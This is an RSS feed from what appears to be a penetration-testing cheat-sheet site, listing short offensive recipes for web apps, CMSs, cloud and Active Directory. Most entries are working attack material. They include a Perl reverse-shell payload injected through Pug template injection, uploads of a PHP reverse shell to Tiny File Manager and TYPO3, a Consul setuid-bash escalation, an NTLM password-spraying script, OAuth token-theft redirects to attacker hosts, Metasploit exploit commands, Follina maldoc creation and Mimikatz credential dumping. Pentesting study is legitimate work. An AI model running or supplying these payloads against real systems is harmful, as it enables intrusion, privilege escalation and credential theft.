      <description>Default Credentials link admin:admin@123 user:12345 Reverse Shell linkIf we can login and access the dashboard of the Tiny File Manager, upload the reverse shell script and get a shell.&#xA;First, download the reverse shell script.&#xA;wget https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php -O shell.php Update values of “$ip” and “$port” in the above script to our local ip and port for listener which will start. Then upload the script to the arbitrary folder in the Tiny File Manager dashboard.</description>
    </item>
    <item>
      <title>XST (Cross-Site Tracing)</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/xst/</guid>
      <description>Add Cookie Header link TRACE / HTTP/1.1 ... Cookie: name=value ... </description>
    </item>
    <item>
      <title>Web PHP Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</link>
      <pubDate>Tue, 20 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/web-php-pentesting/</guid>
      <description>Deobfuscate PHP Files with Syntax Highlighting linkAccording to the PHP Manual, you might be able to deobfuscate php files by accessing with phps extension if the &amp;ldquo;highlight_file&amp;rdquo; is used in the target website.&#xA;https://vulnerable.com/index.phps </description>
    </item>
    <item>
      <title>HashiCorp Consul Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</link>
      <pubDate>Sat, 10 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/hashicorp-consul-pentesting/</guid>
      <description>Privilege Escalation linkIf you have the ACL token (xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxx), you may be able to privilege escalation.&#xA;First, create a script which changes the permission of ‘bash’.&#xA;echo &amp;#39;chmod &amp;#43;s /usr/bin/bash&amp;#39; &amp;gt; /tmp/exploit.sh Then curl.&#xA;curl --header &amp;#34;X-Consul-Token: &amp;lt;ACL-TOKEN&amp;gt;&amp;#34; --request PUT -d &amp;#39;{&amp;#34;ID&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Name&amp;#34;: &amp;#34;test&amp;#34;, &amp;#34;Address&amp;#34;: &amp;#34;127.0.0.1&amp;#34;, &amp;#34;Port&amp;#34;: 80, &amp;#34;check&amp;#34;: {&amp;#34;Args&amp;#34;: [&amp;#34;/usr/bin/bash&amp;#34;, &amp;#34;/tmp/e.sh&amp;#34;], &amp;#34;interval&amp;#34;: &amp;#34;10s&amp;#34;, &amp;#34;timeout&amp;#34;: &amp;#34;1s&amp;#34;}}&amp;#39; http://127.0.0.1:8500/v1/agent/service/register KV (Key/Value) Store link # Put consul kv put --token &amp;lt;ACL-TOKEN&amp;gt; key value consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 path/to/store data </description>
    </item>
    <item>
      <title>How to Use OWASP ZAP</title>
      <link>https://documentnation.github.io/docs/hdks/web/tool/how-to-use-owasp-zap/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/tool/how-to-use-owasp-zap/</guid>
      <description>Automated Scan link Ajax Spider&#xA;If you want to use the ajax spider with HtmlUnit (the easiest way), you may need to install the HtmlUnit.&#xA;sudo apt install libjenkins-htmlunit-core-js-java Intercept Request link Right-click on the URL. Select “Break…” The “Add Breakpoint” window will appear. Manual Request linkOWASP ZAP can resend a request in which you can manually edit the header like the Burp Suite’s Repeater.&#xA;Right-click on the URL. Select “Open/Resend with Request Editor…”.</description>
    </item>
    <item>
      <title>NTLM (New Technology LAN Manager) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/active-directory/ntlm-pentesting/</guid>
      <description>Password Spraying Attack (Brute Force Credentials) linkFirst off, prepare the wordlist of usernames.&#xA;anthony.reynolds samantha.thompson dawn.turner frances.chapman ... Next create the exploit for brute force attack.&#xA;#!/usr/bin/python3 import requests from requests_ntlm import HttpNtlmAuth import sys, getopt class NTLMSprayer: def __init__(self, fqdn): self.HTTP_AUTH_FAILED_CODE = 401 self.HTTP_AUTH_SUCCEED_CODE = 200 self.verbose = True self.fqdn = fqdn def load_users(self, userfile): self.users = [] lines = open(userfile, &amp;#39;r&amp;#39;).readlines() for line in lines: self.users.append(line.replace(&amp;#34;\r&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;\n&amp;#34;, &amp;#34;&amp;#34;)) def password_spray(self, password, url): print (&amp;#34;[*] Starting passwords spray attack using the following password: &amp;#34; &amp;#43; password) count = 0 for user in self.</description>
    </item>
    <item>
      <title>OAuth Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/security-risk/oauth-attack/</guid>
      <description>Change User Info link POST /authenticate HTTP/1.1 ... { &amp;#34;email&amp;#34;:&amp;#34;victim@example.com&amp;#34;, &amp;#34;username&amp;#34;:&amp;#34;attacker&amp;#34;, &amp;#34;token&amp;#34;:&amp;#34;b7Gl7Xoy...&amp;#34; } Steal Tokens link Open Web Server in Your Local Machine&#xA;python3 -m http.server 8000 Inject Your Local URL to the Redirect URL&#xA;Access to the URL below.&#xA;https://vulnerable.com/oauth?redirect_url=http://&amp;lt;attacker-ip&amp;gt;:8000/login&amp;amp;response_type=token&amp;amp;scope=all CSRF link Steal Code&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/oauth-linking?code=kZ7bfFa...&amp;#34;&amp;gt;&amp;lt;/iframe&amp;gt; Hijack redirect_url&#xA;&amp;lt;iframe src=&amp;#34;https://vulnerable.com/auth?client_id=ysdj...&amp;amp;redirect_uri=https://attacker.com&amp;amp;response_type=code&amp;amp;scope=openid%20profile%20email&amp;#34;&amp;gt; &amp;lt;/iframe&amp;gt; Open Redirect&#xA;&amp;lt;script&amp;gt; if (!document.location.hash) { window.location = &amp;#39;https://vulnerable.com/auth?client_id=7Fdx8a...&amp;amp;redirect_uri=https://vulnerable.com/oauth-callback/../post/next?path=https://attacker.com/exploit/&amp;amp;response_type=token&amp;amp;nonce=398...&amp;amp;scope=openid%20profile%20email&amp;#39; } else { window.location = &amp;#39;/?&amp;#39;&amp;#43;document.location.hash.substr(1) } &amp;lt;/script&amp;gt; Proxy Page (postMessage)</description>
    </item>
    <item>
      <title>OOB (Out of Band) Attack</title>
      <link>https://documentnation.github.io/docs/hdks/web/oob-attack/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/oob-attack/</guid>
      <description>Tools linkinteractsh linkOOB (Out Of Band) interaction gathering server and client library.&#xA;interactsh-client </description>
    </item>
    <item>
      <title>PowerView</title>
      <link>https://documentnation.github.io/docs/hdks/windows/powershell/powerview/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/powershell/powerview/</guid>
      <description>Enabling PowerView on PowerShell link Import-Module .\PowerView.ps1 To start PowerView&#xA;. .\PowerView.ps1 Enumeration link # List domain users Get-NetUser | select cn # List domain groups Get-NetGroup -GroupName *admin* # Get shared folders Invoke-ShareFinder # Get operating systems running Get-NetComputer -fulldata | select operatingsystem # Find files or directories Get-ChildItem -r -Filter &amp;#34;*.txt&amp;#34; -Name </description>
    </item>
    <item>
      <title>Pug Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/template-engine/pug-pentesting/</guid>
      <description>Server-Side Template Injection (SSTI) link #{2*2} #{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(&amp;#34;child_process&amp;#34;).exec(&amp;#39;id&amp;#39;)}()} Reverse Shell linkFirst off, create a payload.&#xA;use Socket;$i=&amp;#34;&amp;lt;local-ip&amp;gt;&amp;#34;;$p=&amp;lt;local-port&amp;gt;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;S&amp;#34;);exec(&amp;#34;/bin/sh -i&amp;#34;);}; Encode it with Base64.&#xA;And start listener for getting the incoming connection.&#xA;nc -lvnp 4444 Then prepare the full payload contained the above Base64 encoded hash.&#xA;h1= Hello world p 3*3 is #{3*3} #{spawn_sync = this.process.binding(&amp;#39;spawn_sync&amp;#39;)} #{ normalizeSpawnArguments = function(c,b,a){if(Array.isArray(b)?b=b.slice(0):(a=b,b=[]),a===undefined&amp;amp;&amp;amp;(a={}),a=Object.assign({},a),a.shell){const g=[c].concat(b).join(&amp;#39; &amp;#39;);typeof a.shell===&amp;#39;string&amp;#39;?c=a.shell:c=&amp;#39;/bin/sh&amp;#39;,b=[&amp;#39;-c&amp;#39;,g];}typeof a.argv0===&amp;#39;string&amp;#39;?b.unshift(a.argv0):b.unshift(c);var d=a.env||process.env;var e=[];for(var f in d)e.push(f&amp;#43;&amp;#39;=&amp;#39;&amp;#43;d[f]);return{file:c,args:b,options:a,envPairs:e};}} #{spawnSync = function(){var d=normalizeSpawnArguments.apply(null,arguments);var a=d.</description>
    </item>
    <item>
      <title>TYPO3 Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/typo3-pentesting/</guid>
      <description>Directory Discovery link /fileadmin/ /typo3/ /typo3conf/ /typo3temp/ Default Credentials link admin:&amp;lt;password-specified-when-installed&amp;gt; Reverse Shell (Admin Credential Required) linkFirst, to check and edit the configuration of the uploaded file extension, go to “ADMIN TOOLS” → “Configure Installation-Wide Options” → “Backend” → “fileDenyPattern”.&#xA;Update the configuration if necessary. For example, remove “php[1-9]?”&#xA;\.(phpsh|phtml|pht|phar|shtml|cgi)(\..*)?$|\.pl$|^\.htaccess$ Next, prepare the payload for reverse shell named “shell.php”.&#xA;wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php Go to “FILE” → “Filelist” and upload the payload to the root of /fileadmin.</description>
    </item>
    <item>
      <title>Webmin Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</link>
      <pubDate>Thu, 01 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/webmin-pentesting/</guid>
      <description>Default Credentials link admin:admin password_chagne.cgi Command Injection version=1.890 link msfconsole msf&amp;gt; use exploit/linux/http/webmin_backdoor msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; run shell Remote Code Execution (RCE) version&amp;lt;2.37 linkWebmin version&amp;lt;2.37 is vulnerable to remote code execution.&#xA;Download the payload .&#xA;git clone https://github.com/MuirlandOracle/CVE-2019-15107 cd CVE-2019-15107 python3 CVE-2019-15107.py &amp;lt;target-ip&amp;gt; </description>
    </item>
    <item>
      <title>AJP (Apache JServ Protocol) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/ajp-pentesting/</guid>
      <description>Enumeration link nmap --script ajp-auth -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-auth --script-args ajp-auth.path=/login -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-brute -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-headers -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-methods -p 8009 &amp;lt;target-ip&amp;gt; nmap --script ajp-request -p 8009 &amp;lt;target-ip&amp;gt; Ghostcat File Inclusion linkIt&amp;rsquo;s a vulnerability of Tomcat AJP (CVE-2020-1938).&#xA;Use Metasploit for exploiting it.&#xA;msfconsole msf6 &amp;gt; use auxiliary/admin/http/tomcat_ghostcat msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf6 auxiliary(admin/http/tomcat_ghostcat) &amp;gt; exploit </description>
    </item>
    <item>
      <title>Apache Struts Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/framework/java/apache-struts-pentesting/</guid>
      <description>Struts2 OGNL Elavasion linkMetasploit is useful for exploiting.&#xA;msfconsole msf &amp;gt; use multi/http/struts2_content_type_ognl msf &amp;gt; set payload linux/x86/meterpreter/reverse_tcp msf &amp;gt; exploit meterpreter &amp;gt; shell SHELL=/bin/bash script -q /dev/null </description>
    </item>
    <item>
      <title>Atlassian Confluence Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/atlassian-confluence-pentesting/</guid>
      <description>Remote Code Execution (CVE-2022-26134) linkDownload the exploit from the repo.&#xA;python3 exploit.py -u http://&amp;lt;target-ip&amp;gt; -c whoami </description>
    </item>
    <item>
      <title>AWS (Amazon Web Services) Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cloud/aws-pentesting/</guid>
      <description>Amazon Resource Names (ARNs) link # Format arn:aws:&amp;lt;service&amp;gt;:&amp;lt;region&amp;gt;:&amp;lt;account_id&amp;gt;:&amp;lt;resource_type&amp;gt;/&amp;lt;resource_name&amp;gt; Identify and Access Management (IAM) link # Add credentials # This will add entries to .aws/config or .aws/credentials in user&amp;#39;s home directory. # &amp;lt;profile-name&amp;gt; is arbitrary. aws configure --profile &amp;lt;profile-name&amp;gt; # List credentials aws configure list --profile &amp;lt;profile-name&amp;gt; # Find the account id belonging to an access key (access key starts with &amp;#34;AKIA&amp;#34;) aws sts get-access-key-info --access-key-id AKIAQ31B... # Determin the username the access key you&amp;#39;re using belogns to aws sts get-caller-identity --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account aws ec2 describe-instances --output text --profile &amp;lt;profile-name&amp;gt; # List all EC2 instances running in an account in a dirrerent region aws ec2 describe-instances --output text --region us-east-1 --profile &amp;lt;profile-name&amp;gt; Amazon S3 linkA public cloud storage resource available in Amazon Web Services (AWS) Simple Storage Service (S3), an object storage offering.</description>
    </item>
    <item>
      <title>Bolt CMS Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</link>
      <pubDate>Tue, 22 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/cms/bolt-cms-pentesting/</guid>
      <description>Login Page link /bolt Remote Code Execution (v3.7.1) link msfconsole msf&amp;gt; use exploit/unix/webapp/bolt_authenticated_rce msf&amp;gt; set lhost &amp;lt;local-ip&amp;gt; msf&amp;gt; set rhosts &amp;lt;target-ip&amp;gt; msf&amp;gt; set username &amp;lt;username&amp;gt; msf&amp;gt; set password &amp;lt;password&amp;gt; msf&amp;gt; run </description>
    </item>
    <item>
      <title>Microsoft Word Pentesting</title>
      <link>https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/</link>
      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/service/microsoft-word-pentesting/</guid>
      <description>Follina MSDT (CVE-2022-30190) linkMicrosoft Support Diagnostic Tool (MSDT) is vulnerable with Follina.&#xA;1. Download the Payload in Local Machine linkClone the payload from msdt-follina.&#xA;2. Create the Maldoc in Local Machine link # -i: interface name python3 follina.py -i eth0 Then a new maldoc named “follina.doc” will be created in the current directory.&#xA;Now you’ve started the web server.&#xA;3. Open Another Web Server in Local Machine linkOpen another terminal and move to the msdt-follina directory, then start web server to transfer the maldoc to target machine.</description>
    </item>
    <item>
      <title>Mimikatz</title>
      <link>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</link>
      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/windows/privilege-escalation/mimikatz/</guid>
      <description>You can download it from the GitHub repository.&#xA;Usage link mimikatz Check if Mimikatz Running as an Administrator&#xA;mimikatz # privilege::debug Elevate to SYSTEM Level&#xA;mimikatz # token::elevate Dump Hashes&#xA;mimikatz # lsadump::lsa /patch Security Identifier of the Kerberos Ticket Granting Ticket Account&#xA;mimikatz # lsadump::lsa /inject /name:krbtgt All SAM Local Password Hashes&#xA;mimikatz # lsadump::sam Credentials from the LSASS Memory&#xA;mimikatz # sekurlsa::logonpasswords Create a Kerberos Golden Ticket&#xA;mimikatz # kerberos::golden /user:Administrator /domain:sample.</description>
    </item>
    <item>
      <title>Code Deobfuscation</title>
      <link>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      <guid>https://documentnation.github.io/docs/hdks/web/code-deobfuscation/</guid>
      <description>Deobfuscation link JavaScript&#xA;JavaScript Deobfuscator Obfuscation link JavaScript&#xA;Manual Obfuscation&#xA;Access https://obfuscator.io/.&#xA;Change “String Array Encoding” to “Base64”.&#xA;Paste JavaScript code.&#xA;Click &amp;ldquo;Obfuscate&amp;rdquo;.&#xA;Try running it on https://jsconsole.com/.&#xA;Use Online Tools&#xA;JSFuck&#xA;jjencode&#xA;aaencode</description>
    </item>
  </channel>
</rss>
